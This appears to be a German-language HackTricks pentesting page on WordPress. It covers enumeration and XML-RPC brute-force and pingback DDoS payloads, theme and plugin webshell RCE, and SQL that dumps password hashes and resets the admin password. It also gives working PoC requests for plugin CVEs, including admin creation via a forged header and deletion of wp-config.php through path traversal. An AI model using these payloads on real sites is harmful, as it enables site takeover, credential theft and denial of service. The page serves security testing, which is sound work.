# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

- **Hochgeladene** Dateien landen in: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Theme-Dateien k√∂nnen in /wp-content/themes/ gefunden werden,** daher wenn du etwas PHP des Themes √§nderst, um RCE zu erreichen, wirst du wahrscheinlich diesen Pfad verwenden. Zum Beispiel: Mit dem **theme twentytwelve** kannst du die **404.php** Datei erreichen unter: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Eine weitere n√ºtzliche URL k√∂nnte sein:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** findest du das Root-Passwort der Datenbank.
- Standard Login-Pfade zum √úberpr√ºfen: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Wichtige WordPress-Dateien**

- `index.php`
- `license.txt` enth√§lt n√ºtzliche Informationen wie die installierte WordPress-Version.
- `wp-activate.php` wird f√ºr den E-Mail-Aktivierungsprozess beim Einrichten einer neuen WordPress-Site verwendet.
- Login-Ordner (k√∂nnen umbenannt sein, um sie zu verstecken):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ist eine Datei, die eine Funktion von WordPress darstellt, die es erm√∂glicht, Daten √ºber HTTP als Transportmechanismus und XML als Kodierungsmechanismus zu √ºbertragen. Diese Art der Kommunikation wurde durch die WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ersetzt.
- Der `wp-content` Ordner ist das Hauptverzeichnis, in dem Plugins und Themes gespeichert werden.
- `wp-content/uploads/` ist das Verzeichnis, in dem alle zur Plattform hochgeladenen Dateien gespeichert werden.
- `wp-includes/` Dieses Verzeichnis enth√§lt Core-Dateien wie Zertifikate, Fonts, JavaScript-Dateien und Widgets.
- `wp-sitemap.xml` In WordPress-Versionen 5.5 und h√∂her generiert WordPress eine Sitemap-XML-Datei mit allen √∂ffentlichen Posts und √∂ffentlich abfragbaren Post-Typen und Taxonomien.

**Post-Exploitation**

- Die `wp-config.php` Datei enth√§lt Informationen, die WordPress ben√∂tigt, um eine Verbindung zur Datenbank herzustellen, wie z. B. Datenbankname, Datenbank-Host, Benutzername und Passwort, Authentication Keys and Salts sowie das Tabellen-Prefix. Diese Konfigurationsdatei kann auch verwendet werden, um den DEBUG-Modus zu aktivieren, was bei der Fehlersuche n√ºtzlich sein kann.

### Benutzerberechtigungen

- **Administrator**
- **Editor**: Ver√∂ffentlicht und verwaltet seine eigenen und die Beitr√§ge anderer
- **Author**: Ver√∂ffentlicht und verwaltet seine eigenen Beitr√§ge
- **Contributor**: Schreibt und verwaltet seine Beitr√§ge, kann sie aber nicht ver√∂ffentlichen
- **Subscriber**: Kann Beitr√§ge lesen und sein Profil bearbeiten

## **Passive Aufkl√§rung**

### **WordPress-Version ermitteln**

Pr√ºfe, ob du die Dateien `/license.txt` oder `/readme.html` findest

Im **Quellcode** der Seite (Beispiel von [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS-Link-Dateien

![](<../../images/image (533).png>)

- JavaScript-Dateien

![](<../../images/image (524).png>)

### Plugins abrufen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Themes abrufen
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Versionen allgemein extrahieren
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

Du wirst wahrscheinlich nicht in der Lage sein, alle Plugins and Themes zu finden. Um alle zu entdecken, musst du **actively Brute Force a list of Plugins and Themes** (hoffentlich gibt es automatisierte Tools, die diese Listen enthalten).

### Users

- **ID Brute:** Du erh√§ltst g√ºltige Benutzer von einer WordPress-Seite by Brute Forcing users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Wenn die Antworten **200** oder **30X** sind, bedeutet das, dass die id **g√ºltig** ist. Wenn die Antwort **400** ist, dann ist die id **ung√ºltig**.

- **wp-json:** Sie k√∂nnen auch versuchen, Informationen √ºber die Benutzer zu erhalten, indem Sie abfragen:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ein weiterer `/wp-json/`-Endpoint, der einige Informationen √ºber Benutzer offenlegen kann, ist:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Beachte, dass dieser Endpunkt nur Benutzer offenlegt, die einen Beitrag erstellt haben. **Es werden nur Informationen √ºber Benutzer bereitgestellt, die diese Funktion aktiviert haben**.

Beachte auch, dass **/wp-json/wp/v2/pages** IP-Adressen leak kann.

- **Login username enumeration**: Beim Login auf **`/wp-login.php`** ist die **Nachricht** unterschiedlich ‚Äî sie zeigt an, ob der angegebene **Benutzername** existiert oder nicht.

### XML-RPC

Wenn `xml-rpc.php` aktiv ist, kannst du einen credentials brute-force durchf√ºhren oder es nutzen, um DoS-Angriffe auf andere Ressourcen zu starten. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Um zu pr√ºfen, ob es aktiv ist, versuche auf _**/xmlrpc.php**_ zuzugreifen und diese Anfrage zu senden:

**Pr√ºfen**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** oder **`metaWeblog.getUsersBlogs`** sind einige der Methoden, die verwendet werden k√∂nnen, um Credentials per brute-force zu ermitteln. Wenn Sie eines davon finden, k√∂nnen Sie etwas wie Folgendes senden:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die Meldung _"Incorrect username or password"_ innerhalb einer Antwort mit Statuscode 200 sollte erscheinen, wenn die Zugangsdaten nicht g√ºltig sind.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Mit den korrekten Zugangsdaten kannst du eine Datei hochladen. In der Antwort erscheint der Pfad ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Au√üerdem gibt es eine **schnellere M√∂glichkeit**, credentials per **brute-force** mit **`system.multicall`** anzuwenden, da du mehrere credentials in derselben Anfrage testen kannst:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA umgehen**

Diese Methode ist f√ºr Programme und nicht f√ºr Menschen gedacht und veraltet, daher unterst√ºtzt sie kein 2FA. Wenn du also g√ºltige creds hast, aber der Hauptzugang durch 2FA gesch√ºtzt ist, **kannst du m√∂glicherweise xmlrpc.php missbrauchen, um dich mit diesen creds einzuloggen und die 2FA zu umgehen**. Beachte, dass du nicht alle Aktionen ausf√ºhren kannst, die √ºber die console m√∂glich sind, aber du kannst trotzdem m√∂glicherweise zu RCE gelangen, wie Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) erkl√§rt.

**DDoS oder port scanning**

Wenn du die Methode _**pingback.ping**_ in der Liste findest, kannst du Wordpress dazu bringen, eine beliebige Anfrage an einen beliebigen Host/Port zu senden.\
Das kann verwendet werden, um **tausende** von Wordpress **sites** dazu zu bringen, auf eine **location** zuzugreifen (wodurch an diesem Ort ein **DDoS** verursacht wird), oder du kannst es nutzen, um Wordpress ein internes **network** **scan**nen zu lassen (du kannst jeden Port angeben).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Wenn Sie **faultCode** mit einem Wert **gr√∂√üer** als **0** (17) erhalten, bedeutet das, dass der Port offen ist.

Siehe die Verwendung von **`system.multicall`** im vorherigen Abschnitt, um zu lernen, wie man diese Methode missbraucht, um DDoS zu verursachen.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Diese Datei existiert normalerweise im Root der Wordpress-Site: **`/wp-cron.php`**\
Wenn diese Datei **aufgerufen** wird, wird eine "**heavy**" MySQL **query** ausgef√ºhrt, weshalb sie von **attackers** verwendet werden k√∂nnte, um einen **DoS** zu **verursachen**.\
Au√üerdem wird standardm√§√üig `wp-cron.php` bei jedem Seitenaufruf (immer wenn ein Client eine Wordpress-Seite anfordert) aufgerufen, was auf stark frequentierten Seiten Probleme (DoS) verursachen kann.

Es wird empfohlen, Wp-Cron zu deaktivieren und einen echten cronjob auf dem Host einzurichten, der die ben√∂tigten Aktionen in regelm√§√üigen Abst√§nden ausf√ºhrt (ohne Probleme zu verursachen).

### /wp-json/oembed/1.0/proxy - SSRF

Versuche, _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ aufzurufen ‚Äî die Worpress-Site k√∂nnte dann eine Anfrage an dich senden.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Dieses Tool pr√ºft, ob der **methodName: pingback.ping** und der Pfad **/wp-json/oembed/1.0/proxy** vorhanden sind, und falls ja, versucht es, diese auszunutzen.

## Automatische Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Zugriff durch √úberschreiben eines Bits

Mehr als ein echter Angriff ist das eine Kuriosit√§t. Im CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) konnte man 1 Bit in jeder wordpress-Datei flippen. So konnte man an Position `5389` der Datei `/var/www/html/wp-includes/user.php` das Bit so √§ndern, dass die NOT (`!`) Operation zu einem NOP wurde.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**√Ñndern einer php-Datei des verwendeten Themes (Admin-Zugangsdaten erforderlich)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (at the right)

√Ñndere den Inhalt zu einer php shell:

![](<../../images/image (384).png>)

Suche im Internet, wie du auf diese aktualisierte Seite zugreifen kannst. In diesem Fall musst du hier zugreifen: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Du kannst verwenden:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
um eine Session zu bekommen.

## Plugin RCE

### PHP plugin

Es kann m√∂glich sein, .php-Dateien als Plugin hochzuladen.\
Erstelle deine php backdoor zum Beispiel mit:

![](<../../images/image (183).png>)

F√ºge dann ein neues Plugin hinzu:

![](<../../images/image (722).png>)

Plugin hochladen und auf Install Now klicken:

![](<../../images/image (249).png>)

Klicke auf Procced:

![](<../../images/image (70).png>)

Wahrscheinlich scheint das zun√§chst nichts zu tun, aber wenn du zu Media gehst, siehst du deine hochgeladene Shell:

![](<../../images/image (462).png>)

Rufe sie auf und du siehst die URL, um die reverse shell auszuf√ºhren:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Diese Methode beinhaltet die Installation eines bekannten, verwundbaren b√∂sartigen Plugins, das ausgenutzt werden kann, um eine web shell zu erhalten. Dieser Vorgang wird √ºber das WordPress-Dashboard wie folgt durchgef√ºhrt:

1. **Plugin Acquisition**: Das Plugin wird von einer Quelle wie Exploit DB beschafft, z. B. [**hier**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Gehe zum WordPress-Dashboard, dann zu `Dashboard > Plugins > Upload Plugin`.
- Lade die ZIP-Datei des heruntergeladenen Plugins hoch.
3. **Plugin Activation**: Sobald das Plugin erfolgreich installiert ist, muss es √ºber das Dashboard aktiviert werden.
4. **Exploitation**:
- Mit installiertem und aktiviertem Plugin "reflex-gallery" kann dieses ausgenutzt werden, da es als verwundbar bekannt ist.
- Das Metasploit Framework stellt einen Exploit f√ºr diese Schwachstelle bereit. Durch Laden des entsprechenden Moduls und Ausf√ºhren bestimmter Befehle kann eine meterpreter session hergestellt werden, die unautorisierten Zugriff auf die Seite gew√§hrt.
- Es wird darauf hingewiesen, dass dies nur eine von vielen Methoden ist, eine WordPress-Seite auszunutzen.

Der Inhalt enth√§lt visuelle Hilfen, die die Schritte im WordPress-Dashboard zum Installieren und Aktivieren des Plugins zeigen. Es ist jedoch wichtig zu beachten, dass das Ausnutzen von Schwachstellen auf diese Weise ohne entsprechende Autorisierung illegal und unethisch ist. Diese Informationen sollten verantwortungsbewusst und nur in einem legalen Kontext verwendet werden, z. B. beim pentesting mit ausdr√ºcklicher Genehmigung.

**F√ºr detailliertere Schritte siehe:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Von XSS zu RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ist ein Script, das dazu entwickelt wurde, eine **Cross-Site Scripting (XSS)**-Schwachstelle zu eskalieren zu **Remote Code Execution (RCE)** oder anderen kritischen Schwachstellen in WordPress. F√ºr mehr Infos siehe [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Es bietet **Unterst√ºtzung f√ºr Wordpress-Versionen 6.X.X, 5.X.X und 4.X.X und erm√∂glicht:**
- _**Privilege Escalation:**_ Erstellt einen Benutzer in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Lade dein custom plugin (backdoor) nach WordPress hoch.
- _**(RCE) Built-In Plugin Edit:**_ Bearbeite eingebaute Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Bearbeite eingebaute Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Eigene Exploits f√ºr Drittanbieter-WordPress-Plugins/-Themes.

## Post Exploitation

Extrahiere Benutzernamen und Passw√∂rter:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin-Passwort √§ndern:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Angriffsfl√§che

Es ist entscheidend zu wissen, wie ein Wordpress-Plugin Funktionalit√§t nach au√üen freigibt, um Schwachstellen in dieser Funktionalit√§t zu finden. Wie ein Plugin Funktionalit√§t offenlegen kann, sehen Sie in den folgenden Stichpunkten; Beispiele verwundbarer Plugins finden Sie in [**diesem Blogpost**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Eine der M√∂glichkeiten, wie ein Plugin Funktionen f√ºr Benutzer exponieren kann, ist √ºber AJAX-Handler. Diese k√∂nnen Logik-, Autorisierungs- oder Authentifizierungsfehler enthalten. Au√üerdem ist es ziemlich h√§ufig, dass diese Funktionen sowohl die Authentifizierung als auch die Autorisierung auf das Vorhandensein eines Wordpress nonce st√ºtzen, das **jeder in der Wordpress-Instanz authentifizierte Benutzer haben k√∂nnte** (unabh√§ngig von seiner Rolle).

Dies sind die Funktionen, die verwendet werden k√∂nnen, um eine Funktion in einem Plugin nach au√üen zu exponieren:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die Verwendung von `nopriv` macht den endpoint f√ºr alle Benutzer zug√§nglich (auch f√ºr nicht authentifizierte).**

> [!CAUTION]
> Au√üerdem, wenn die Funktion die Autorisierung des Benutzers nur mit der Funktion `wp_verify_nonce` pr√ºft, √ºberpr√ºft diese Funktion lediglich, ob der Benutzer eingeloggt ist; sie pr√ºft normalerweise nicht die Rolle des Benutzers. Daher k√∂nnten Benutzer mit niedrigen Rechten Zugriff auf hochprivilegierte Aktionen erhalten.

- **REST API**

Es ist auch m√∂glich, Funktionen aus wordpress √ºber die Registrierung einer REST API mit der Funktion `register_rest_route` freizulegen:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Der `permission_callback` ist eine Callback-Funktion, die pr√ºft, ob ein bestimmter Benutzer berechtigt ist, die API-Methode aufzurufen.

**Wenn die eingebaute Funktion `__return_true` verwendet wird, √ºberspringt sie einfach die √úberpr√ºfung der Benutzerberechtigungen.**

- **Direkter Zugriff auf die PHP-Datei**

Nat√ºrlich verwendet Wordpress PHP und Dateien innerhalb von Plugins sind direkt √ºber das Web zug√§nglich. Wenn also ein Plugin eine verwundbare Funktionalit√§t offenlegt, die allein durch den Zugriff auf die Datei ausgel√∂st wird, ist sie von jedem Benutzer ausnutzbar.

### Trusted-header REST-Identit√§tsvort√§uschung (WooCommerce Payments ‚â§ 5.6.1)

Einige Plugins implementieren ‚Äútrusted header‚Äù-Shortcuts f√ºr interne Integrationen oder Reverse Proxies und verwenden diesen Header dann, um den aktuellen Benutzerkontext f√ºr REST-Anfragen zu setzen. Wenn der Header nicht kryptographisch an die Anfrage durch eine vorgelagerte Komponente gebunden ist, kann ein Angreifer ihn f√§lschen und privilegierte REST-Routen als Administrator aufrufen.

- Auswirkung: Unauthentifizierte Privilegieneskalation zum Admin, indem ein neuer Administrator √ºber die core users REST-Route erstellt wird.
- Beispiel-Header: `X-Wcpay-Platform-Checkout-User: 1` (erzwingt Benutzer-ID 1, typischerweise das erste Administrator-Konto).
- Ausgenutzte Route: `POST /wp-json/wp/v2/users` mit einem erh√∂hten role-Array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- Das Plugin mappt einen vom Client kontrollierten Header auf den Authentifizierungsstatus und umgeht capability-Pr√ºfungen.
- WordPress core erwartet die `create_users`-capability f√ºr diese Route; der Plugin-Hack umgeht dies, indem er den aktuellen Benutzerkontext direkt aus dem Header setzt.

Expected success indicators

- HTTP 201 mit einem JSON-Body, der den erstellten Benutzer beschreibt.
- Ein neuer Admin-Benutzer sichtbar in `wp-admin/users.php`.

Detection checklist

- Grep nach `getallheaders()`, `$_SERVER['HTTP_...']`, oder vendor SDKs, die benutzerdefinierte Header lesen, um den Benutzerkontext zu setzen (z.B. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- √úberpr√ºfe REST-Registrierungen auf privilegierte Callbacks, die keine robusten `permission_callback`-Pr√ºfungen haben und stattdessen auf Request-Header vertrauen.
- Suche nach Verwendungen von Core-User-Management-Funktionen (`wp_insert_user`, `wp_create_user`) innerhalb von REST-Handlern, die nur durch Header-Werte abgesichert sind.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probleme, die durch diesen Ausschnitt entstehen:

* **Unauthenticated access** ‚Äì the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** ‚Äì jeder Besucher kann den Endpoint aufrufen.
* **No path sanitisation** ‚Äì der vom Benutzer kontrollierte `fontfamily`-String wird ohne Filter an einen Dateisystempfad angeh√§ngt, wodurch klassisches `../../`-Traversal m√∂glich ist.

#### Ausnutzung

Ein Angreifer kann jede Datei oder jedes Verzeichnis **unterhalb des uploads base directory** (normalerweise `<wp-root>/wp-content/uploads/`) durch das Senden einer einzigen HTTP POST-Anfrage l√∂schen:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Da `wp-config.php` au√üerhalb von *uploads* liegt, reichen auf einer Standardinstallation vier `../`-Sequenzen aus. Das L√∂schen von `wp-config.php` zwingt WordPress beim n√§chsten Besuch in den *Installationsassistenten* und erm√∂glicht eine komplette √úbernahme der Seite (der Angreifer liefert einfach eine neue DB-Konfiguration und erstellt einen Admin-Benutzer).

Weitere wirkungsvolle Ziele sind Plugin-/Theme-`.php`-Dateien (um Sicherheits-Plugins zu sabotieren) oder `.htaccess`-Regeln.

#### Checkliste zur Erkennung

* Jeder `add_action( 'wp_ajax_nopriv_...')` Callback, der Filesystem-Helper (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.) aufruft.
* Konkatenation unsanitisierten Nutzer-Inputs in Pfade (Achte auf `$_POST`, `$_GET`, `$_REQUEST`).
* Fehlen von `check_ajax_referer()` und `current_user_can()`/`is_user_logged_in()`.

---

### Privilegieneskalation durch veraltete Rollenzur√ºcksetzung und fehlende Autorisierung (ASE "View Admin as Role")

Viele Plugins implementieren eine "view as role" oder tempor√§re Rollentausch-Funktion, indem sie die urspr√ºnglichen Rolle(n) im user meta speichern, damit diese sp√§ter wiederhergestellt werden k√∂nnen. Wenn der Wiederherstellungsweg ausschlie√ülich auf Request-Parametern (z. B. `$_REQUEST['reset-for']`) und einer plugin-gepflegten Liste beruht, ohne capabilities und einen g√ºltigen nonce zu pr√ºfen, f√ºhrt das zu einer vertikalen Privilegieneskalation.

Ein reales Beispiel fand sich im Admin and Site Enhancements (ASE) Plugin (‚â§ 7.6.2.1). Der Reset-Zweig stellte Rollen anhand von `reset-for=<username>` wieder her, wenn der Benutzername in einem internen Array `$options['viewing_admin_as_role_are']` auftauchte, f√ºhrte jedoch weder eine `current_user_can()`-Pr√ºfung noch eine Nonce-√úberpr√ºfung durch, bevor die aktuellen Rollen entfernt und die in user meta `_asenha_view_admin_as_original_roles` gespeicherten Rollen wieder hinzugef√ºgt wurden:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Warum es ausnutzbar ist

- Vertraut `$_REQUEST['reset-for']` und einer Plugin-Option ohne serverseitige Autorisierung.
- Wenn ein Benutzer zuvor h√∂here Privilegien in `_asenha_view_admin_as_original_roles` gespeichert hatte und herabgestuft wurde, kann er diese wiederherstellen, indem er den Reset-Pfad aufruft.
- In einigen Deployments konnte jeder authentifizierte Benutzer ein Reset f√ºr einen anderen Benutzernamen ausl√∂sen, der noch in `viewing_admin_as_role_are` vorhanden ist (fehlerhafte Autorisierung).

Exploitation (Beispiel)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Auf verwundbaren Builds entfernt dies die aktuellen Rollen und f√ºgt die gespeicherten ‚Äúoriginal roles‚Äù (z. B. `administrator`) wieder hinzu, wodurch effektiv privilege escalation erfolgt.

Detection checklist

- Suchen Sie nach role-switching-Funktionen, die ‚Äúoriginal roles‚Äù im user meta speichern (z. B. `_asenha_view_admin_as_original_roles`).
- Identifizieren Sie Reset/Restore-Pfade, die:
- Benutzernamen aus `$_REQUEST` / `$_GET` / `$_POST` lesen.
- Rollen √ºber `add_role()` / `remove_role()` √§ndern, ohne `current_user_can()` und `wp_verify_nonce()` / `check_admin_referer()` zu verwenden.
- Auf Basis eines Plugin-Options-Arrays autorisieren (z. B. `viewing_admin_as_role_are`) statt anhand der capabilities des Akteurs.

---

### Nicht authentifizierte privilege escalation via cookie‚Äëtrusted user-switching on public init (Service Finder ‚Äúsf-booking‚Äù)

Einige Plugins binden user-switching-Hilfsfunktionen an den √∂ffentlichen `init` Hook und leiten die Identit√§t aus einem vom Client kontrollierten Cookie ab. Ruft der Code `wp_set_auth_cookie()` auf, ohne Authentifizierung, capability und einen g√ºltigen Nonce zu pr√ºfen, kann jeder nicht authentifizierte Besucher eine Anmeldung als beliebige User-ID erzwingen.

Typisches vulnerables Muster (vereinfacht aus Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Warum es ausnutzbar ist

- √ñffentlicher `init` Hook macht den Handler f√ºr nicht authentifizierte Benutzer erreichbar (keine `is_user_logged_in()`-Abfrage).
- Die Identit√§t wird aus einem vom Client √§nderbaren Cookie (`original_user_id`) abgeleitet.
- Direkter Aufruf von `wp_set_auth_cookie($uid)` meldet den Anfragenden als diesen Benutzer an, ohne Capability- oder Nonce-Pr√ºfungen.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF-√úberlegungen f√ºr WordPress/plugin CVEs

Generische Edge-/Server-WAFs sind auf breite Muster (SQLi, XSS, LFI) abgestimmt. Viele hochwirksame WordPress/plugin-Schwachstellen sind anwendungsspezifische Logik- oder auth-Fehler, die wie harmloser Traffic aussehen, sofern die Engine WordPress-Routen und Plugin-Semantik nicht versteht.

Offensive Hinweise

- Ziele plugin-spezifische Endpunkte mit sauberen Payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste zuerst unauth-Pfade (AJAX `nopriv`, REST mit permissivem `permission_callback`, √∂ffentliche shortcodes). Standard-Payloads funktionieren oft ohne Verschleierung.
- Typische hochwirksame F√§lle: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive Hinweise

